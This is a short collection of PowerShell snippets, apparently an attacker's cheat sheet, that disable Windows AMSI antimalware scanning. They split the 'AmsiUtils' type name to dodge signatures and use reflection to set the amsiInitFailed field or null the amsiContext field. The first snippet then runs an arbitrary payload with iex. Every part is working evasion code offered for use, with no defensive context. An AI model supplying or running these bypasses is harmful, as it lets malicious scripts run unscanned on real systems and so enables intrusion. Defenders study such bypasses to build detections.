```pws# Obfuscate variable names 
$v1 = "System.Management.Automation.Am"
$v2 = "siUtils"
$type = [Ref].Assembly.GetType($v1+$v2)

# Then use reflection 
$field = $type.GetFields('NonPublic,Static') | Where-Object Name -like "*InitFailed"
$field.SetValue($null, $true)

# Now execute your payload
iex $payload```




=======================================================================================
=
=                                     Another ONe
=
=======================================================================================

$var1 = "System.Management.Automation.Am"
$var2 = "siUtils"
$type = [Ref].Assembly.GetType($var1+$var2)


=======================================================================================
=
=                                     Another ONe
=
=======================================================================================

$AMSI = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $AMSI.GetFields('NonPublic,Static') | Where-Object Name -eq 'amsiContext'
$field.SetValue($null, $null)

